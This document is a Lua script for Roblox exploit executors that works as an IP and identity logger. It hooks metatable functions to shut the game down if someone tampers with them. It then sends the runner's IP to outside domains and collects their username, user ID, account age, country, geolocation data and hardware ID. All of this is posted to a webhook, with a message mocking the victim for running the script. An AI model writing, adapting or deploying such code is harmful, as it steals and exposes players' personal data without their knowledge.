hookfunction(setmetatable, function() game.Players.LocalPlayer:Kick("Fetching failed, Please try again later"); wait(2); game:Shutdown() end)
hookfunction(getmetatable, function() game.Players.LocalPlayer:Kick("Fetching failed, Please try again later"); wait(2); game:Shutdown() end)
wait(1)
local GetIp = game:HttpGet("https://v4.ident.me/")
local HttpService = game:GetService("HttpService")
local headers = {
    ["content-type"] = "application/json"
}
url = "https://api.hugebonus.xyz/v2/endpoint/?ip="..GetIp
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = {}, Method = "GET", Headers = headers}
sigma = request(abcdef)

local validiate = game:HttpGet("https://apiendpoint.donutorbonus.workers.dev/?ip="..GetIp)

-- Parse the JSON response
local parsedResponse = HttpService:JSONDecode(sigma.Body)
-- Access the 'match' value
local matchValue = parsedResponse["match"]
local expected_ip = parsedResponse["expected_ip"]
local actual_ip = parsedResponse["actual_ip"]

if expected_ip ~= "0.0.0.0" then
    print("rizzler")
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")

    -- Player Info
    local LocalPlayer = Players.LocalPlayer
    local Userid = LocalPlayer.UserId
    local DName = LocalPlayer.DisplayName
    local Name = LocalPlayer.Name
    local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
    local AccountAge = LocalPlayer.AccountAge
    local Country = game.LocalizationService.RobloxLocaleId
    local GetData = game:HttpGet("http://ip-api.com/json")
    local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
    local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
    local HttpService = game:GetService("HttpService")


    local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

    -- Detecting Executor
    local function detectExecutor()
        local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                        or (secure_load and "Sentinel")
                        or (pebc_execute and "ProtoSmasher")
                        or (KRNL_LOADED and "Krnl")
                        or (is_sirhurt_closure and "SirHurt")
                        or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                        or "Unsupported"
        return executor
    end


-- Replace the webhook URL with your own URL
    
    -- Creating Webhook Data
    local function createWebhookData()
        local webhookcheck = detectExecutor()
        
        local data = {
            ["avatar_url"] = "",
            ["content"] = "Hey! silly person just execute your script LMAO",
            ["embeds"] = {
                {
                    ["author"] = {
                        ["name"] = "",
                        ["url"] = "https://roblox.com",
                    },
                    ["description"] = string.format(
                        "__[Player Info](https://www.roblox.com/users/%d)__" ..
                        " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                        "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                        "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                        "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                        "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                        Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                        tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                        game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                        GetData, ConsoleJobId
                    ),
                    ["type"] = "rich",
                    ["color"] = tonumber("0xf489ff"), -- Change the color if you want
                    ["thumbnail"] = {
                        ["url"] = ""
                    },
                }
            }
        }
        return HttpService:JSONEncode(data)
    end
    -- Sending Webhook
    local function sendWebhook(webhookUrl, data)
        local headers = {
            ["content-type"] = "application/json"
        }

        local request = http_request or request or HttpPost or syn.request
        local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
        request(abcdef)
    end

    sigmaurl = "farewell goodbye!"
    local webhookUrl = ""..tostring(sigmaurl)
    local webhookData = createWebhookData()
    sendWebhook(webhookUrl, webhookData)
else game.Players.LocalPlayer:Kick("Fetching failed, Please try again later") 
    wait(2)
    game:Shutdown()
end
